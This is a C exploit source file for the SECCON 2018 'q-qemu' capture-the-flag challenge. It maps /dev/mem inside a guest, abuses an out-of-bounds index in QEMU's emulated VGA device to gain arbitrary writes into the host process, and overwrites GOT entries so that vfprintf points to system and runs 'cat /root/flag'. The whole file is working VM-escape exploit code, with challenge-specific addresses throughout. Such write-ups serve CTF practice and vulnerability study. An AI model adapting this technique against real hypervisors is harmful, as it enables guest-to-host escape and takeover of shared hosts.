/*
Author: raycp
File: exp.c
Description: exp for seccon 2018 q-qemu, out-of-bound vuln with vga device.
Date: 2019-08-21
*/

#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>

uint32_t mmio_addr = 0xfebc1000;
uint32_t mmio_size = 0x1000;
uint32_t vga_addr = 0xa0000;
uint32_t vga_size = 0x20000;

unsigned char* mmio_mem;
unsigned char* vga_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void* mem_map( const char* dev, size_t offset, size_t size )
{
    int fd = open( dev, O_RDWR | O_SYNC );
    if ( fd == -1 ) {
        return 0;
    }

    void* result = mmap( NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset );

    if ( !result ) {
        return 0;
    }

    close( fd );
    return result;
}

uint8_t vga_mem_read(uint32_t addr)
{
    return *((uint8_t*) (vga_mem+addr));
}

void vga_mem_write(uint32_t addr, uint8_t value)
{
    *( (uint8_t *) (vga_mem+addr) ) = value;
}

void set_sr(uint32_t index, uint32_t value)
{
    *( (uint32_t *) (mmio_mem+4) ) = index;
    *( (uint32_t *) (mmio_mem+5) ) = value;
}

void set_latch( uint32_t value){
    //vga_mem_read(value&0xffff);
    vga_mem_read((value>>16)&0xffff);
    vga_mem_read(value&0xffff);
}

void arbitrary_write(uint32_t addr, char *value, uint32_t size)
{
    int i;
    //set_sr(7,1);
    set_latch(addr);
    

    set_sr(0xcc,3); // set vs max_size
    vga_mem_write(0x10000, size);
    
    set_sr(0xcc,1);
    //action=(0x10<<16)|+
    for (i=0; i<size; i++) {
        vga_mem_write(0x10000,value[i]);
    }

    
}
    

int main(int argc, char *argv[])
{
    
    //step 1 mmap /dev/mem to system, (man mem) to see the detail
    system( "mknod -m 660 /dev/mem c 1 1" );

    //step2 map the address to fd
	mmio_mem = mem_map( "/dev/mem", mmio_addr, mmio_size );
    if ( !mmio_mem ) {
        die("mmap mmio failed");
    }

    vga_mem = mem_map( "/dev/mem", vga_addr, vga_size );
    if ( !vga_mem ) {
        die("mmap vga mem failed");
    }
	
    //step3 set sr[7] to 1, so we can reach the vuln code.
    set_sr(7,1); //set sr[7] to 1

    //step4 first init latch
    vga_mem_read(1&0xffff);

    //step5 set idx to 0x10 which is out-of-bound to latch[0]
    set_sr(0xcd,0x10); // set sr[0xcd] to 0x10 to set vuln index to 0x10

    //step6 write "cat /root/flag" to bss addr
    uint64_t bss_addr=0x109E540;
    char *para_string="cat /root/flag";
    arbitrary_write(bss_addr, para_string, strlen(para_string));
    
    //step7 write bss addr to qemu_logfile addr
    uint32_t qemu_logfile_addr=0x10CCBE0;
    arbitrary_write(qemu_logfile_addr,(char*)&bss_addr,8);

    //step8 write system addr to vfprintf got
    uint32_t vfprintf_got=0xEE7BB0;
    uint64_t system_plt=0x409DD0;
    arbitrary_write(vfprintf_got,(char*)&system_plt, 8);

    //step9 write qemu_log addr to printf_chk got
    uint32_t printf_chk_got=0xEE7028;
    uint64_t qemu_log_addr=0x9726E8;
    arbitrary_write(printf_chk_got,(char*)&qemu_log_addr,8);

    //step10 trigger printf_chk then get flag
    set_sr(0xcc,2);
    vga_mem_write(0x10000,1);
     
}

